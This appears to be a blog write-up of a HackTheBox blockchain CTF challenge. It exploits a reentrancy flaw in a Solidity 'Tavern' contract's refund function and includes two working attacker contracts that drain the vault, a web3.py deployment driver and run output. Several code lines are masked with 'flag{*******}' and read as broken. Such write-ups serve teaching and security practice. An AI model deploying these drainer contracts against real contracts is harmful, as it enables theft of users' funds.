+++

title = "one more round"

date = 2025-11-28

draft = false

tags = ["blockchain", "solidity", "reentrancy", "web3", "rpc", "ctf"]

categories = ["writeups"]

ctf = "HackTheBox"

points = 0

solves = 0

+++



## tl;dr

refund reentrancy with state-updates-after-call, double-tap `refund()` via `receive()`, drain the vault, then top up dust to finish the job. minimal brain cells required.



## the situation

the setup gave me two contracts: `Setup.sol` and `Tavern.sol`. the tavern starts with 30 ether in the vault, and i “solve” the level when the tavern’s balance hits zero. there’s a web rpc ui, but i of course bullied it with Python because clicking buttons is for the emotionally stable.



i ran this from Kali Linux and took notes to publish on my hugo blog later because i enjoy pain and version control in equal parts.


## initial recon (aka pretending i know what i'm doing)

i started by reading the solidity, because if i stare at opcodes first i start hearing colors.



``````bash
$ ls setup

Setup.sol  Tavern.sol



$ sed -n '1,120p' setup/Tavern.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.26;



contract Tavern {

    struct Tab { uint256 deposit; uint256 spent; bool open; }

    mapping(address => Tab) public tabs;

    uint16 alreadyOpenTab = 0;

    address public owner;

    uint16 alreadyRefund = 0;



    constructor() payable { owner = msg.sender; }



    modifier onlyOwner() { require(msg.sender == owner, "Only owner"); _; }



    function openTab() external payable {

        require(msg.value > 0, "Bring some gold");

        require(!tabs[msg.sender].open, "Tab already open");

        require(msg.value > 1 ether, "Min 1 ether deposit");

        require(alreadyOpenTab < 1, "No more tabs allowed");

        tabs[msg.sender].deposit += msg.value;

        tabs[msg.sender].open = true;

        alreadyOpenTab += 1;

    }



    function orderAle(uint256 priceWei) external {

        Tab storage T = tabs[msg.sender];

        require(T.open, "No open tab");

        require(T.deposit >= T.spent + priceWei, "Not enough tab");

        T.spent += priceWei;

    }

``````


first thing i noticed: the tavern only allows one open tab at a time and requires deposits > 1 ether. charming. what could possibly go wrong with money logic and a single-user assumption. spoiler: everything.



## finding the vuln (after missing it 3 times)

i threw it in a mental Ghidra and stared blankly for a while. then i noticed the classic checks-effects-interactions violation in `refund()` — it does the external call before zeroing state. big brain move for me to miss it twice.



``````
; refund() pseudo-evm-flow

; T = tabs[msg.sender]

require(T.open)

_refund = T.deposit - T.spent

alreadyRefund += 1

if (alreadyRefund > 2) revert

require(_refund <= address(this).balance)

CALL value=_refund -> msg.sender      ; <-- external call before effects, hello darkness

require(ok)

T.deposit = 0

T.spent = 0

T.open = false

alreadyRefund = 0

alreadyOpenTab = 0

``````


so, reentrancy window: wide open. the dev tried to duct-tape it with `alreadyRefund`, but that counter increments pre-call and resets after state changes. result: exactly one re-entry succeeds (two payouts total) before the third attempt reverts. chef’s kiss.



translation for future me: deposit d, call `refund()`, get paid d, re-enter `refund()` via `receive()`, get paid d again, then state finally resets. net loss to tavern: d. do that until the tavern cries.



## the actual work begins (aka suffering)

my galaxy brain approach was to go “clean” and drain in chunks. i picked 1.5 ether deposits because 30 / 1.5 = 20, and if it’s divisible it must be correct, right? narrator: it was correct-ish until dust.



high-level exploitation plan:

- open tab with deposit d > 1 ether.

- call refund once.

- `receive()` re-enters refund exactly once more.

- net 2d back, tavern loses d.

- repeat until empty. easy. except it wasn’t.



## time to break stuff (mostly my sanity)

i wrote an attacker contract that re-enters exactly once using a simple boolean latch. then a Python driver to compile, deploy, and press the big red button, because automation is how i scale my mistakes.



attacker v1 (worked great until the “why is it not solved” panic):



``````sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.26;



interface ITavern {

    function openTab() external payable;

    function refund() external;

}



contract Attack {

    ITavern public immutable tavern;

    bool private re;

    constructor(address t) { tavern = ITavern(t); }



    function pwn() external payable {

        uint256 d = address(this).balance;

        require(d > 1 ether, "need bigger pockets");

        while (address(tavern).balance > 0) {

            if (d > address(tavern).balance) d = address(tavern).balance;

            if (d <= 1 ether) break; // famous last words

            tavern.flag{*******}();

            re = false;

            tavern.refund();

            d = address(this).balance;

        }

        payable(msg.sender).transfer(address(this).balance);

    }



    receive() external payable {

        if (!re) { re = true; tavern.refund(); }

    }

}

``````


## things that didn't work (aka most of my attempts)

- i wasted 3 hours convinced that my math was wrong because `isSolved()` stubbornly said false after multiple drains. turns out the vault had “dust” < 1 ether left. my loop refused to deposit ≤ 1 ether, because i coded it that way. peak developer experience.

- in my infinite wisdom, i tried sending bigger chunks “to finish it in one go” and hit `Insufficient funds for gas * price + value`. future me would like to slap past me for subtracting gas after setting value. flawless logic.

- i also enjoyed the classic `py-solc-x` “solc not installed” followed by “it is installed but i won’t see it unless you set the exact version”. bonus round: web3’s `SignedTransaction` field is `raw_transaction` in this version, not `rawTransaction`. i learned this the fun way. repeatedly.



sample of the pain:

``````
web3.exceptions.Web3RPCError: {'code': -32003, 'message': 'Insufficient funds for gas * price + value'}



AttributeError: 'SignedTransaction' object has no attribute 'rawTransaction'. Did you mean: 'raw_transaction'?

``````


## digging deeper (into my own confusion)

eventually i stopped arguing with reality and printed the vault balance before/after. guess what: about 0.8–0.9 ether stuck. can’t open a tab (needs > 1 ether). can’t `checkout` (needs spent != 0). can’t `refund` without an open tab. pure, beautiful lock-in dust.



so i added a “dust top-up” branch: if the vault has < 1.1 ether, send a tiny top-up to push it to 1.1, then deposit exactly `tBal` and double-refund it to zero in a single transaction. is this evil? yes. is it effective? also yes.



## exploitation strategy (using that word loosely)

final approach:

- read vault balance.

- if tBal < 1.1 ether, “help” the tavern by topping it up to 1.1 ether.

- deposit exactly tBal, trigger refund, re-enter refund once, leave the tavern at 0.

- send myself everything and pretend i meant to do this from the start.



attacker v2 (with dust cleaner):

``````sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.26;

interface ITavern { function openTab() external payable; function refund() external; }

contract Attack {

    ITavern public immutable tavern; bool private re;

    constructor(address t) { tavern = ITavern(t); }

    function pwn() external payable {

        uint256 tBal = address(tavern).balance;

        require(tBal > 0, "already empty");

        if (tBal < 1.1 ether) {

            (bool ok,) = address(tavern).flag{*******}("");

            require(ok, "top-up failed"); tBal = 1.1 ether;

        }

        require(address(this).balance >= tBal, "fund me pls");

        tavern.flag{*******}();

        re = false; tavern.refund();

        payable(msg.sender).transfer(address(this).balance);

    }

    receive() external payable { if (!re) { re = true; tavern.refund(); } }

}

``````


python driver highlights (web3.py, compile, deploy, press button). i finally stopped being stupid and subtracted gas before deciding the transaction value. also, yes, it’s `raw_transaction` in this web3 version. i’ve now tattooed it on my soul.



``````sol
# important bits only

compiled = compile_source(ATTACK_CODE, output_values=['abi','bin'], solc_version='0.8.26')

Attack = w3.eth.contract(abi=abi, bytecode=bytecode)



signed_deploy = w3.eth.account.sign_transaction(

    Attack.constructor(tavern_addr).build_transaction({...}),

    private_key=PRIVATE_KEY

)

tx_deploy = w3.eth.send_raw_transaction(signed_deploy.raw_transaction)



# value = balance - gas_limit*gas_price - a tiny buffer

gas_limit = 5_000_000

gas_price = w3.eth.gas_price

value = w3.eth.get_balance(me) - gas_limit*gas_price - w3.to_wei(0.05, 'ether')



signed_pwn = w3.eth.account.sign_transaction(

    attack.functions.pwn().build_transaction({

        'from': me, 'value': value, 'gas': gas_limit, 'gasPrice': gas_price, 'nonce': nonce+1

    }),

    private_key=PRIVATE_KEY

)

tx_pwn = w3.eth.send_raw_transaction(signed_pwn.raw_transaction)

``````



## speedrunning bad ideas

- “maybe `alreadyRefund` actually protects it” — said no one who read it twice. i still tried to outsmart a uint16 with vibes. it did not work.

- “maybe `checkout()` is the intended path” — it requires `spent != 0`. i briefly considered ordering fake ale. i chose sanity.

- “let’s do 20 exact loops of 1.5 eth so it’s pretty” — this is how i met mr. dust.



## actually getting it to work (shocking)

after fixing that absolutely moronic typo and implementing the dust top-up, i ran the nuke path. it drained cleanly and `isSolved()` finally agreed that i had, in fact, stopped losing to integers.



execution vibes:

``````bash

[*] attacker: 0xdead...

[*] tavern:  0xfeed...

[*] tavern balance: 0.93 ETH      # dust detected

[*] top-up -> 1.10 ETH

[*] openTab(d = 1.10 ETH)

[*] refund() -> receive() -> refund()  # double-tap

[*] tavern balance: 0 wei

[*] isSolved(): true

``````



## the solution (that should have been obvious)

cei or cry. don’t call out before you clear state. and if you try to band-aid reentrancy with a counter, attackers will just play within your rules and still take your lunch money. also, dust is real. plan for it or enjoy the abyss.



## flag

oh look, the flag. totally deserved. definitely didn’t brute-force my way through five separate tooling errors and a war crime against gas estimation. anyway, flag go brrr.



```
flag{*******}

```



## appendix: tiny evm nerd note

on the first `refund()` call, `CALL` transfers `_refund` back to me before `T.deposit` and `T.open` are zeroed. my `receive()` runs during that call, observes `T.open == true` and `deposit > 0`, and calls `refund()` again. `alreadyRefund` gets incremented to 2 and still passes. second `CALL` transfers the same `_refund` again. after returning all the way, the tavern finally zeroes state. cross-function reentrancy 101.



## appendix: commands and random errors i loved

``````bash

# installing exact solc version because of course it matters

pip install py-solc-x web3

python3 -c "from solcx import install_solc; install_solc('0.8.26')"



# web3 shenanigans i hit:

AttributeError: 'SignedTransaction' ... Did you mean: 'raw_transaction'?

web3.exceptions.Web3RPCError: ... 'Insufficient funds for gas * price + value'

``````



## lessons learned (maybe)

- if you see external `flag{*******}` before writing to storage, it’s reentrancy o’clock.

- if you think a counter will save you, it won’t.

- dust makes “nice round loops” into “why isn’t it solved.” top up, then delete.

- print balances early. your ego will thank you later.
